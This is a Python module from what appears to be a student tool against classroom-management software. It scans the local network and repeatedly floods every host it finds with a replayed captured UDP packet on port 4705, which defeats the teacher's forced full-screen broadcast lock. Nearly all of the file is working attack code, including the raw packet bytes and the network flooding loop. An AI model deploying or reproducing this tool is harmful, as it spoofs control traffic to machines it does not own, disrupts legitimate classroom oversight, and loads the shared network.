import ctypes
import socket
import threading
import time
from colorama import Fore, init
from utils import UtilsManager as utils
from utils.impl.ConfigManager import config
from utils.impl.ErrorHandler import handle_exception, NetworkError

init(autoreset=True)

TARGET_PORT = config.get("target_port", 4705)

@handle_exception(SystemError, default_return=None, error_message="Failed to start anti full screen module")
def _handle_anti_full_screen():
    """
    处理反全屏模块的选项
    启动一个线程持续发送反全屏数据包
    """
    # 就是说呢，用的Coco抓包抓出来的神秘反全屏，写壳子写出了史山
    # 本来是想要新建一个窗口放后台持续发包，但是写了几天写炸了干脆放前台了，后面换gui了再尝试写
    utils.warn("This module will consume significant CPU and network resources. Do you wish to proceed?")

    # 神秘确认
    module2_choice = input("[Yes/No](Default N): ")
    if module2_choice.lower() == "yes" or module2_choice.lower() == "y":
        utils.info(Fore.LIGHTYELLOW_EX + "You can Press Ctrl+C to stop this module.")
        for i in ["5", "4", "3", "2", "1"]:
            utils.info(Fore.LIGHTYELLOW_EX + f"You can Press Ctrl+C to stop this module.({i})")
            time.sleep(1)
        module2_choice = True
    else:
        module2_choice = False

    if module2_choice:
        try:
            utils.info("Starting Thread...")
            # 确保之前的线程已停止
            stop_module2()
            time.sleep(0.5)  # 等待线程停止

            # 使用全局变量存储线程引用以便管理
            global _anti_fullscreen_thread
            _anti_fullscreen_thread = threading.Thread(target=module2_main, daemon=True)
            _anti_fullscreen_thread.start()
            utils.info("Started!")

            # 等待用户中断
            try:
                while _anti_fullscreen_thread.is_alive():
                    time.sleep(0.1)  # 减少睡眠时间以便更快响应Ctrl+C
            except KeyboardInterrupt:
                utils.info("\nStopping module...")
                stop_module2()
                _anti_fullscreen_thread.join(timeout=2)  # 等待线程结束，最多2秒
                if _anti_fullscreen_thread.is_alive():
                    utils.warn("Module did not stop gracefully")
                else:
                    utils.info("Module stopped!")
                # 不重新抛出KeyboardInterrupt，让用户返回主菜单
        except KeyboardInterrupt:
            # 捕获KeyboardInterrupt，确保能退出到主菜单
            utils.info("\nOperation cancelled by user.")
        except Exception as e:
            utils.error(f"Failed to start anti full screen module: {e}")
            raise SystemError(f"Failed to start anti full screen module: {e}")
    else:
        utils.info("Cancelled.")


# 全局变量，用于控制module2_main线程的运行状态
_module2_running = True
_anti_fullscreen_thread = None


def stop_module2():
    """停止module2_main线程"""
    global _module2_running, _anti_fullscreen_thread
    _module2_running = False

    # 如果线程存在，等待它结束
    if _anti_fullscreen_thread and _anti_fullscreen_thread.is_alive():
        _anti_fullscreen_thread.join(timeout=1)  # 等待最多1秒


def module2_main(status=True):
    """
    反全屏模块的主函数

    Args:
        status (bool): 控制循环是否继续
    """
    global _module2_running
    _module2_running = status

    while _module2_running:
        try:
            ip_list = utils.ip_scanner()
            if ip_list and len(ip_list) > 0:  # 确保列表不为空且有效
                for i in ip_list:
                    # 检查是否应该继续运行
                    if not _module2_running:
                        break
                    # 确保IP地址格式正确
                    if i and len(i) >= 1 and i[0]:
                        anti_full_screen(i[0])
                    else:
                        utils.warn(f"Invalid IP format: {i}")
            else:
                utils.warn("No active hosts found. Retrying in 0.3 seconds...")
            time.sleep(0.3)
        except KeyboardInterrupt:
            # 捕获Ctrl+C信号，退出循环
            utils.info("Module interrupted by user.")
            break
        except Exception as e:
            utils.error(f"Error in module2_main: {e}")
            time.sleep(1)  # 发生错误时等待更长时间再重试


@handle_exception(NetworkError, default_return=False, error_message="Failed to send anti full screen packet")
def anti_full_screen(target_ip, target_port=TARGET_PORT):
    """
    反全屏功能 - 发送反全屏数据包到指定IP

    Args:
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705

    Returns:
        bool: 发送成功返回True，失败返回False
    """
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(config.get("timeout", 5))  # 从配置管理器获取超时时间

    # 获取反全屏数据包
    payload = _get_anti_full_screen_payload()

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (anti_full_screen)")
        return True
    except socket.timeout:
        utils.error(f"[-] Timeout while sending anti full screen packet to {target_ip}:{target_port}")
        return False
    except socket.error as e:
        utils.error(f"[-] Socket error while sending anti full screen packet: {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
        return False
    finally:
        sock.close()


def _get_anti_full_screen_payload():
    """
    获取反全屏数据包

    Returns:
        bytearray: 反全屏数据包
    """
    # 嗯抓包抓到的嗯对
    payload = bytearray([
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00,
        0x01, 0x00, 0xc6, 0x00, 0x00, 0x00, 0x1a, 0x8f, 0xd9, 0xc3, 0x60, 0xad, 0x07, 0x41, 0xac, 0xf0,
        0xc0, 0xfb, 0x12, 0x7d, 0x06, 0x1d, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0xb9, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x20, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x11, 0x2b, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5e, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xa0, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x19, 0x00,
        0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0x04, 0x00,
        0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x03,
        0xe0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6e, 0x00
    ])

    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    return payload